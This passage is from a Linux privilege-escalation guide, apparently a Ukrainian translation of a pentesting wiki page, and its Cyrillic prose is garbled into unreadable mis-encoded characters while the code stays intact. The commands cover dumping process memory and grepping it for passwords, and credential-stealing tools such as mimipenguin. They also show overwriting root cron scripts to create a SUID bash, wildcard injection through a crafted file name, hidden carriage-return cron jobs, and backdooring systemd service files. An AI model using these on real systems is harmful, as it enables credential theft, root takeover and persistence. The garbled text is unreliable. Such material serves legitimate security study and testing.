–î–ª—è –∑–∞–¥–∞–Ω–æ–≥–æ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–∞ –ø—Ä–æ—Ü–µ—Å—É **maps –ø–æ–∫–∞–∑—É—é—Ç—å, —è–∫ –ø–∞–º'—è—Ç—å –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–∞ –≤ –º–µ–∂–∞—Ö –≤—ñ—Ä—Ç—É–∞–ª—å–Ω–æ–≥–æ –∞–¥—Ä–µ—Å–Ω–æ–≥–æ –ø—Ä–æ—Å—Ç–æ—Ä—É —Ü—å–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É**; –≤–æ–Ω–∏ —Ç–∞–∫–æ–∂ –ø–æ–∫–∞–∑—É—é—Ç—å **–ø—Ä–∞–≤–∞ –¥–æ—Å—Ç—É–ø—É –¥–æ –∫–æ–∂–Ω–æ–≥–æ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–æ–≥–æ —Ä–µ–≥—ñ–æ–Ω—É**. –ü—Å–µ–≤–¥–æ—Ñ–∞–π–ª **mem –≤–∏–∫—Ä–∏–≤–∞—î —Å–∞–º—É –ø–∞–º'—è—Ç—å –ø—Ä–æ—Ü–µ—Å—ñ–≤**. –ó —Ñ–∞–π–ª—É **maps –º–∏ –∑–Ω–∞—î–º–æ, —è–∫—ñ –æ–±–ª–∞—Å—Ç—ñ –ø–∞–º'—è—Ç—ñ –¥–æ—Å—Ç—É–ø–Ω—ñ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è** —Ç–∞ —ó—Ö –∑–º—ñ—â–µ–Ω–Ω—è. –ú–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î–º–æ —Ü—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, —â–æ–± **–ø–µ—Ä–µ–π—Ç–∏ –¥–æ —Ñ–∞–π–ª—É mem —Ç–∞ –≤–∏–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –≤—Å—ñ –¥–æ—Å—Ç—É–ø–Ω—ñ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è –æ–±–ª–∞—Å—Ç—ñ** —É —Ñ–∞–π–ª.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` –Ω–∞–¥–∞—î –¥–æ—Å—Ç—É–ø –¥–æ **—Ñ—ñ–∑–∏—á–Ω–æ—ó** –ø–∞–º'—è—Ç—ñ —Å–∏—Å—Ç–µ–º–∏, –∞ –Ω–µ –≤—ñ—Ä—Ç—É–∞–ª—å–Ω–æ—ó –ø–∞–º'—è—Ç—ñ. –í—ñ—Ä—Ç—É–∞–ª—å–Ω–∏–π –ø—Ä–æ—Å—Ç—ñ—Ä –∞–¥—Ä–µ—Å —è–¥—Ä–∞ –º–æ–∂–Ω–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ /dev/kmem.\
–ó–∞–∑–≤–∏—á–∞–π, `/dev/mem` –º–æ–∂–µ –±—É—Ç–∏ –ø—Ä–æ—á–∏—Ç–∞–Ω–∏–π —Ç—ñ–ª—å–∫–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º **root** —Ç–∞ –≥—Ä—É–ø–æ—é **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump –¥–ª—è Linux

ProcDump - —Ü–µ –ø–µ—Ä–µ–æ—Å–º–∏—Å–ª–µ–Ω–Ω—è –∫–ª–∞—Å–∏—á–Ω–æ–≥–æ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—É ProcDump –∑ –Ω–∞–±–æ—Ä—É —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ Sysinternals –¥–ª—è Windows. –û—Ç—Ä–∏–º–∞–π—Ç–µ –π–æ–≥–æ –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏

–î–ª—è –≤–∏–≤–µ–¥–µ–Ω–Ω—è –ø–∞–º'—è—Ç—ñ –ø—Ä–æ—Ü–µ—Å—É –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_–í–∏ –º–æ–∂–µ—Ç–µ –≤—Ä—É—á–Ω—É –≤–∏–¥–∞–ª–∏—Ç–∏ –≤–∏–º–æ–≥–∏ root —Ç–∞ –≤–∏–≤–µ—Å—Ç–∏ –ø—Ä–æ—Ü–µ—Å, —è–∫–∏–π –≤–∞–º –Ω–∞–ª–µ–∂–∏—Ç—å
* –°–∫—Ä–∏–ø—Ç A.5 –∑ [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (–ø–æ—Ç—Ä—ñ–±–µ–Ω root) 

### –û–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –∑ –ø–∞–º'—è—Ç—ñ –ø—Ä–æ—Ü–µ—Å—É

#### –ü—Ä–∏–∫–ª–∞–¥ –≤—Ä—É—á–Ω—É

–Ø–∫—â–æ –≤–∏ –≤–∏—è–≤–∏—Ç–µ, —â–æ –ø—Ä–æ—Ü–µ—Å –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–∞ –ø—Ä–∞—Ü—é—î:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏—Ç—è–≥—Ç–∏ –ø—Ä–æ—Ü–µ—Å (–¥–∏–≤. –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ —Ä–æ–∑–¥—ñ–ª–∏, —â–æ–± –∑–Ω–∞–π—Ç–∏ —Ä—ñ–∑–Ω—ñ —Å–ø–æ—Å–æ–±–∏ –≤–∏–ª—É—á–µ–Ω–Ω—è –ø–∞–º'—è—Ç—ñ –ø—Ä–æ—Ü–µ—Å—É) —Ç–∞ —à—É–∫–∞—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø–∞–º'—è—Ç—ñ:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) –±—É–¥–µ **–≤–∏–∫—Ä–∞–¥–∞—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ —É –≤–∏–≥–ª—è–¥—ñ —á—ñ—Ç–∫–æ–≥–æ —Ç–µ–∫—Å—Ç—É –∑ –ø–∞–º'—è—Ç—ñ** —Ç–∞ –∑ –¥–µ—è–∫–∏—Ö **–≤—ñ–¥–æ–º–∏—Ö —Ñ–∞–π–ª—ñ–≤**. –î–ª—è –ø—Ä–∞–≤–∏–ª—å–Ω–æ—ó —Ä–æ–±–æ—Ç–∏ –≤—ñ–Ω –ø–æ—Ç—Ä–µ–±—É—î –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ root.

| –û—Å–æ–±–ª–∏–≤—ñ—Å—Ç—å                                       | –ù–∞–∑–≤–∞ –ø—Ä–æ—Ü–µ—Å—É        |
| ------------------------------------------------- | -------------------- |
| –ü–∞—Ä–æ–ª—å GDM (Kali Desktop, Debian Desktop)         | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (–ê–∫—Ç–∏–≤–Ω—ñ FTP-–∑'—î–¥–Ω–∞–Ω–Ω—è)                   | vsftpd               |
| Apache2 (–ê–∫—Ç–∏–≤–Ω—ñ HTTP Basic Auth —Å–µ—Å—ñ—ó)          | apache2              |
| OpenSSH (–ê–∫—Ç–∏–≤–Ω—ñ SSH-—Å–µ—Å—ñ—ó - –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è Sudo)  | sshd:                |

#### –ü–æ—à—É–∫ Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## –ó–∞–ø–ª–∞–Ω–æ–≤–∞–Ω—ñ/Cron –∑–∞–≤–¥–∞–Ω–Ω—è

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ —î —è–∫—ñ-–Ω–µ–±—É–¥—å –∑–∞–ø–ª–∞–Ω–æ–≤–∞–Ω—ñ –∑–∞–≤–¥–∞–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–∏–º–∏. –ú–æ–∂–ª–∏–≤–æ, –≤–∏ –∑–º–æ–∂–µ—Ç–µ —Å–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏—Å—è —Å–∫—Ä–∏–ø—Ç–æ–º, —è–∫–∏–π –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –≤—ñ–¥ —ñ–º–µ–Ω—ñ root (–≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å —É —à–∞–±–ª–æ–Ω–∞—Ö? –º–æ–∂–Ω–∞ –∑–º—ñ–Ω—é–≤–∞—Ç–∏ —Ñ–∞–π–ª–∏, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î root? –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Å–∏–º–≤–æ–ª—å–Ω—ñ –ø–æ—Å–∏–ª–∞–Ω–Ω—è? —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ —Ñ–∞–π–ª–∏ –≤ –∫–∞—Ç–∞–ª–æ–∑—ñ, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### –®–ª—è—Ö Cron

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ _/etc/crontab_ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –®–õ–Ø–•: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á "user" –º–∞—î –ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å —É /home/user_)

–Ø–∫—â–æ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ü—å–æ–≥–æ crontab –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á root –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è –≤–∏–∫–æ–Ω–∞—Ç–∏ —è–∫—É—Å—å –∫–æ–º–∞–Ω–¥—É –∞–±–æ —Å–∫—Ä–∏–ø—Ç –±–µ–∑ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —à–ª—è—Ö—É. –ù–∞–ø—Ä–∏–∫–ª–∞–¥: _\* \* \* \* root overwrite.sh_\
–¢–æ–¥—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –æ–±–æ–ª–æ–Ω–∫—É root, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Å–∫—Ä–∏–ø—Ç–∞ –∑ –º–µ—Ç–∞—Å–∏–º–≤–æ–ª–æ–º (–í–Ω–µ–¥—Ä–µ–Ω–Ω—è –º–µ—Ç–∞—Å–∏–º–≤–æ–ª—ñ–≤)

–Ø–∫—â–æ —Å–∫—Ä–∏–ø—Ç –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º root —ñ –º—ñ—Å—Ç–∏—Ç—å "**\***" –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–æ–º–∞–Ω–¥–∏, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏—Å—è —Ü–∏–º –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –Ω–µ–æ—á—ñ–∫—É–≤–∞–Ω–∏—Ö –¥—ñ–π (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤). –ü—Ä–∏–∫–ª–∞–¥:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**–Ø–∫—â–æ –º–µ—Ç–∞—Å–∏–º–≤–æ–ª –ø–µ—Ä–µ–¥—É—î —à–ª—è—Ö—É, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥** _**/some/path/\***_, **—Ç–æ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –≤—ñ–¥—Å—É—Ç–Ω—è (–Ω–∞–≤—ñ—Ç—å** _**./\***_ **–Ω–µ —î –≤—Ä–∞–∑–ª–∏–≤–∏–º).**

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –ø—Ä–∏–π–æ–º—ñ–≤ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –º–µ—Ç–∞—Å–∏–º–≤–æ–ª—ñ–≤ –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### –ü–µ—Ä–µ–∑–∞–ø–∏—Å —Å—Ü–µ–Ω–∞—Ä—ñ—é Cron —Ç–∞ —Å–∏–º–≤–æ–ª—ñ—á–Ω–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è

–Ø–∫—â–æ **–º–æ–∂–Ω–∞ –∑–º—ñ–Ω–∏—Ç–∏ —Å—Ü–µ–Ω–∞—Ä—ñ–π Cron**, —è–∫–∏–π –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –≤—ñ–¥ —ñ–º–µ–Ω—ñ root, –º–æ–∂–Ω–∞ –¥—É–∂–µ –ª–µ–≥–∫–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ –æ–±–æ–ª–æ–Ω–∫—É:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
–Ø–∫—â–æ —Å—Ü–µ–Ω–∞—Ä—ñ–π, –≤–∏–∫–æ–Ω–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º root, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **–∫–∞—Ç–∞–ª–æ–≥, –¥–æ —è–∫–æ–≥–æ —É –≤–∞—Å —î –ø–æ–≤–Ω–∏–π –¥–æ—Å—Ç—É–ø**, –º–æ–∂–ª–∏–≤–æ, –±—É–¥–µ –∫–æ—Ä–∏—Å–Ω–æ –≤–∏–¥–∞–ª–∏—Ç–∏ —Ü–µ–π –∫–∞—Ç–∞–ª–æ–≥ —ñ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ —Å–∏–º–≤–æ–ª—ñ—á–Ω–∏–π –ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ —ñ–Ω—à–∏–π –∫–∞—Ç–∞–ª–æ–≥**, –≤ —è–∫–æ–º—É –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è —Å—Ü–µ–Ω–∞—Ä—ñ–π, –∫–æ—Ç—Ä–∏–º –≤–∏ –∫–µ—Ä—É—î—Ç–µ
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### –ß–∞—Å—Ç—ñ cron-–∑–∞–≤–¥–∞–Ω–Ω—è

–í–∏ –º–æ–∂–µ—Ç–µ –º–æ–Ω—ñ—Ç–æ—Ä–∏—Ç–∏ –ø—Ä–æ—Ü–µ—Å–∏, —â–æ–± —à—É–∫–∞—Ç–∏ –ø—Ä–æ—Ü–µ—Å–∏, —è–∫—ñ –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è –∫–æ–∂–Ω—É 1, 2 –∞–±–æ 5 —Ö–≤–∏–ª–∏–Ω. –ú–æ–∂–ª–∏–≤–æ, –≤–∏ –∑–º–æ–∂–µ—Ç–µ —Å–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏—Å—è —Ü–∏–º —ñ –ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, –¥–ª—è **–º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É –∫–æ–∂–Ω—ñ 0,1 —Å–µ–∫—É–Ω–¥–∏ –ø—Ä–æ—Ç—è–≥–æ–º 1 —Ö–≤–∏–ª–∏–Ω–∏**, **—Å–æ—Ä—Ç—É–≤–∞–Ω–Ω—è –∑–∞ –º–µ–Ω—à –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–º–∏ –∫–æ–º–∞–Ω–¥–∞–º–∏** —Ç–∞ –≤–∏–¥–∞–ª–µ–Ω–Ω—è –∫–æ–º–∞–Ω–¥, —è–∫—ñ –±—É–ª–∏ –≤–∏–∫–æ–Ω–∞–Ω—ñ –Ω–∞–π–±—ñ–ª—å—à–µ, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (—Ü–µ –±—É–¥–µ –≤—ñ–¥—Å—Ç–µ–∂—É–≤–∞—Ç–∏ —Ç–∞ –ø–µ—Ä–µ—Ä–∞—Ö–æ–≤—É–≤–∞—Ç–∏ –∫–æ–∂–µ–Ω –ø—Ä–æ—Ü–µ—Å, —è–∫–∏–π –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è).

### –ù–µ–≤–∏–¥–∏–º—ñ cron-–∑–∞–≤–¥–∞–Ω–Ω—è

–ú–æ–∂–ª–∏–≤–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ cron-–∑–∞–≤–¥–∞–Ω–Ω—è, **–¥–æ–¥–∞–≤—à–∏ —Å–∏–º–≤–æ–ª –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è –∫–∞—Ä–µ—Ç–∫–∏ –ø—ñ—Å–ª—è –∫–æ–º–µ–Ω—Ç–∞—Ä—è** (–±–µ–∑ —Å–∏–º–≤–æ–ª—É –Ω–æ–≤–æ–≥–æ —Ä—è–¥–∫–∞), —ñ —Ü–µ cron-–∑–∞–≤–¥–∞–Ω–Ω—è –±—É–¥–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏. –ü—Ä–∏–∫–ª–∞–¥ (–∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É –Ω–∞ —Å–∏–º–≤–æ–ª –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è –∫–∞—Ä–µ—Ç–∫–∏):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## –°–µ—Ä–≤—ñ—Å–∏

### –§–∞–π–ª–∏ _.service_, –¥–æ —è–∫–∏—Ö –º–æ–∂–Ω–∞ –∑–∞–ø–∏—Å—É–≤–∞—Ç–∏

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –º–æ–∂–µ—Ç–µ –≤–∏ –∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–π —Ñ–∞–π–ª `.service`, —è–∫—â–æ –º–æ–∂–µ—Ç–µ, –≤–∏ **–º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ –π–æ–≥–æ**, —â–æ–± –≤—ñ–Ω **–≤–∏–∫–æ–Ω—É–≤–∞–≤ –≤–∞—à—É** –∑–∞–¥–Ω—é **–¥–≤–µ—Ä–∫—É –ø—Ä–∏** –∑–∞–ø—É—Å–∫—É, **–ø–µ—Ä–µ–∑–∞–ø—É—Å–∫—É** –∞–±–æ **–∑—É–ø–∏–Ω—Ü—ñ** —Å–µ—Ä–≤—ñ—Å—É (–º–æ–∂–ª–∏–≤–æ, –≤–∞–º –¥–æ–≤–µ–¥–µ—Ç—å—Å—è –∑–∞—á–µ–∫–∞—Ç–∏, –ø–æ–∫–∏ –º–∞—à–∏–Ω–∞ –ø–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç—å—Å—è).\
–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —Å—Ç–≤–æ—Ä—ñ—Ç—å —Å–≤–æ—é –∑–∞–¥–Ω—é –¥–≤–µ—Ä–∫—É –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ–∞–π–ª—É .service –∑ **`ExecStart=/tmp/script.sh`**

### –í–∏–∫–æ–Ω—É–≤–∞–Ω—ñ —Å–µ—Ä–≤—ñ—Å–Ω—ñ –±—ñ–Ω–∞—Ä–Ω—ñ —Ñ–∞–π–ª–∏

–ü–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ —è–∫—â–æ —É –≤–∞—Å —î **–ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å –¥–ª—è –±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤, —è–∫—ñ –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è —Å–µ—Ä–≤—ñ—Å–∞–º–∏**, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ —ó—Ö –Ω–∞ –∑–∞–¥–Ω—ñ –¥–≤–µ—Ä–∫–∏, —Ç–æ–º—É –∫–æ–ª–∏ —Å–µ—Ä–≤—ñ—Å–∏ –±—É–¥—É—Ç—å –ø–µ—Ä–µ–≤–∏–∫–æ–Ω–∞–Ω—ñ, –∑–∞–¥–Ω—ñ –¥–≤–µ—Ä–∫–∏ –±—É–¥—É—Ç—å –≤–∏–∫–æ–Ω–∞–Ω—ñ.

### systemd PATH - –í—ñ–¥–Ω–æ—Å–Ω—ñ —à–ª—è—Ö–∏

–í–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ —à–ª—è—Ö, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **systemd**, –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
systemctl show-environment
```
–Ø–∫—â–æ –≤–∏ –≤–∏—è–≤–∏—Ç–µ, —â–æ –º–æ–∂–µ—Ç–µ **–∑–∞–ø–∏—Å—É–≤–∞—Ç–∏** –≤ –±—É–¥—å-—è–∫—ñ–π –∑ –ø–∞–ø–æ–∫ —à–ª—è—Ö—É, –≤–∏, –º–æ–∂–ª–∏–≤–æ, –∑–º–æ–∂–µ—Ç–µ **–ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó**. –í–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ —à—É–∫–∞—Ç–∏ —Ñ–∞–π–ª–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Å–ª—É–∂–±, –¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è **–≤—ñ–¥–Ω–æ—Å–Ω—ñ —à–ª—è—Ö–∏**.
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
–ü–æ—Ç—ñ–º —Å—Ç–≤–æ—Ä—ñ—Ç—å **–≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π —Ñ–∞–π–ª** –∑ **—Ç–∞–∫–æ—é –∂ –Ω–∞–∑–≤–æ—é, —è–∫ —ñ –≤—ñ–¥–Ω–æ—Å–Ω–∏–π —à–ª—è—Ö –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø–∞–ø–∫–∏ —à–ª—è—Ö—É systemd, –¥–µ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–∏—Å–∞—Ç–∏, —ñ –∫–æ–ª–∏ –∑–∞–ø–∏—Ç—É—é—Ç—å —Å–µ—Ä–≤—ñ—Å –≤–∏–∫–æ–Ω–∞—Ç–∏ —É—Ä–∞–∑–ª–∏–≤—É –¥—ñ—é (**Start**, **Stop**, **Reload**), –≤–∞—à **–∑–∞–¥–Ω—ñ–π –ø—Ä–æ—Ö—ñ–¥ –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–∏–π** (–Ω–µ–ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –∑–∞–∑–≤–∏—á–∞–π –Ω–µ –º–æ–∂—É—Ç—å –∑–∞–ø—É—Å–∫–∞—Ç–∏/–∑—É–ø–∏–Ω—è—Ç–∏ —Å–µ—Ä–≤—ñ—Å–∏, –∞–ª–µ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ `sudo -l`).

**–î—ñ–∑–Ω–∞–π—Ç–µ—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ —Å–µ—Ä–≤—ñ—Å–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `man systemd.service`.**

## **–¢–∞–π–º–µ—Ä–∏**

